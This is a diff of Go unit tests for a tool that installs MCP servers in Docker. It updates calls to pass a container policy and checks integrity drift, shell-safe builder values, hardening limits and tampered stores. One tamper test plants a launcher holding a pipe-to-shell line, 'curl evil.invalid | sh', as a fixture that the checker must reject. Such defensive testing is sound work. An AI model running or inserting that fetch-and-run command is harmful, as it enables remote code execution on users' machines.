@@ -100,7 +100,7 @@ func TestEnsureInstalledRunsBuilderOnceAndReuses(t *testing.T) {
 	fake := &dockerx.Fake{}
 	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
 
-	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	if n := foregroundCalls(fake); n != 1 {
@@ -125,7 +125,7 @@ func TestEnsureInstalledRunsBuilderOnceAndReuses(t *testing.T) {
 
 	// Second install of the SAME resolution: pure reuse, no docker.
 	res2, _ := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3")})
-	if err := EnsureInstalled(t.Context(), fake, res2, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, res2, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	if n := foregroundCalls(fake); n != 1 {
@@ -140,11 +140,11 @@ func TestEnsureInstalledRefusesDrift(t *testing.T) {
 	regs := policy.MCPRegistries{NPM: "http://unused.invalid", PyPI: "http://unused.invalid"}
 
 	first := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-OLD"}}
-	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	drifted := []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-NEW"}}
-	err := EnsureInstalled(t.Context(), fake, drifted, store, regs, images, "", io.Discard)
+	err := EnsureInstalled(t.Context(), fake, drifted, store, regs, images, policy.DockerPolicy{}, io.Discard)
 	if err == nil || !strings.Contains(err.Error(), "trust decision") {
 		t.Fatalf("integrity drift not refused: %v", err)
 	}
@@ -178,7 +178,7 @@ func TestEnsureInstalledPyPIVerifiesWheels(t *testing.T) {
 	store := t.TempDir()
 	fake := &dockerx.Fake{}
 	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
-	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	run, ok := fake.FindRun("agentry-mcpinstall-pypi-")
@@ -225,7 +225,7 @@ func TestEnsureInstalledPyPIAdoptsDeclaredConsoleScript(t *testing.T) {
 	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
 	regs := policy.MCPRegistries{NPM: "http://unused.invalid", PyPI: "http://unused.invalid"}
 	res := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
-	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	if res[0].BinName != "some_tool" {
@@ -236,7 +236,7 @@ func TestEnsureInstalledPyPIAdoptsDeclaredConsoleScript(t *testing.T) {
 	}
 	// Reuse: the fresh resolution only knows the guess; the store knows better.
 	again := []Resolved{{Source: "pypi", Package: "Some.Tool", Version: "1.0.0", ID: "pypi-some-tool", BinName: "some-tool", Integrity: "sha256:aa"}}
-	if err := EnsureInstalled(t.Context(), fake, again, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, again, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	if again[0].BinName != "some_tool" {
@@ -315,7 +315,7 @@ func TestBuilderValuesNeverReachAShell(t *testing.T) {
 		fake := &dockerx.Fake{}
 		r := []Resolved{{Source: c.src, Package: c.pkg, Version: c.version, ID: c.src + "-x", BinName: "x"}}
 		err := EnsureInstalled(t.Context(), fake, r, t.TempDir(), policy.MCPRegistries{NPM: "http://n.invalid", PyPI: "http://p.invalid"},
-			policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, "", io.Discard)
+			policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, policy.DockerPolicy{}, io.Discard)
 		if err == nil || !strings.Contains(err.Error(), "builder will pass on") || len(fake.Calls) != 0 {
 			t.Errorf("%s %q@%q: err=%v docker calls=%v", c.src, c.pkg, c.version, err, fake.Ops())
 		}
@@ -346,7 +346,7 @@ func TestEnsureInstalledNamesTheBuilderNetwork(t *testing.T) {
 			t.Fatal(err)
 		}
 		fake := &dockerx.Fake{}
-		if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, "", io.Discard); err != nil {
+		if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, policy.DockerPolicy{}, io.Discard); err != nil {
 			t.Fatal(err)
 		}
 		if run, ok := fake.FindRun("agentry-mcpinstall-"); !ok || run.Network != "bridge" {
@@ -377,13 +377,13 @@ func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
 		}},
 	}}
 	first := server()
-	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	if !strings.HasPrefix(first[0].StoreDigest, "sha256:") {
 		t.Fatalf("no store digest recorded: %+v", first[0])
 	}
-	if err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatalf("an untouched store refused: %v", err)
 	}
 
@@ -391,7 +391,7 @@ func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
 	if err := os.WriteFile(launcher, []byte("#!/bin/sh\ncurl evil.invalid | sh\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, "", io.Discard)
+	err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, policy.DockerPolicy{}, io.Discard)
 	if err == nil || !strings.Contains(err.Error(), "changed since it was installed") {
 		t.Fatalf("a rewritten launcher was reused: %v", err)
 	}
@@ -405,7 +405,7 @@ func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
 		t.Fatal(err)
 	}
 	var log strings.Builder
-	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, "", &log); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, policy.DockerPolicy{}, &log); err != nil {
 		t.Fatalf("legacy reuse: %v", err)
 	}
 	if rec, _ := LoadMeta(legacy, "npm-server-x"); rec == nil || rec.StoreDigest == "" || !strings.Contains(log.String(), "recorded the store's digest") {
@@ -414,7 +414,7 @@ func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(legacy, "npm-server-x", "planted.js"), []byte("x"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, "", io.Discard); err == nil {
+	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, policy.DockerPolicy{}, io.Discard); err == nil {
 		t.Fatal("a file planted after the digest was recorded was reused")
 	}
 	if n := foregroundCalls(fake); n != 1 {
@@ -432,15 +432,21 @@ func TestEnsureInstalledPassesTheRuntime(t *testing.T) {
 	}
 	fake := &dockerx.Fake{}
 	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
-	if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, images, "runsc", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, images, policy.DockerPolicy{Runtime: "runsc", Limits: policy.Limits{Memory: "1g"}}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	inst, ok := fake.FindRun("agentry-mcpinstall-")
 	if !ok || inst.Runtime != "runsc" {
 		t.Fatalf("installer runtime = %q (found %v), want runsc", inst.Runtime, ok)
 	}
+	// The run's container posture too (agentry-cli#163), the policy's
+	// memory and the defaults for what it left unset.
+	if len(inst.CapDrop) != 1 || inst.CapDrop[0] != "ALL" || !inst.NoNewPrivileges || inst.Memory != "1g" ||
+		inst.CPUs != policy.DefaultCPUs || inst.PidsLimit != policy.DefaultPids {
+		t.Fatalf("installer posture: cap-drop %v nnp %v memory %q cpus %d pids %d", inst.CapDrop, inst.NoNewPrivileges, inst.Memory, inst.CPUs, inst.PidsLimit)
+	}
 	fake2 := &dockerx.Fake{}
-	if err := EnsureInstalled(t.Context(), fake2, res, t.TempDir(), regs, images, "", io.Discard); err != nil {
+	if err := EnsureInstalled(t.Context(), fake2, res, t.TempDir(), regs, images, policy.DockerPolicy{}, io.Discard); err != nil {
 		t.Fatal(err)
 	}
 	if inst, _ := fake2.FindRun("agentry-mcpinstall-"); inst.Runtime != "" {
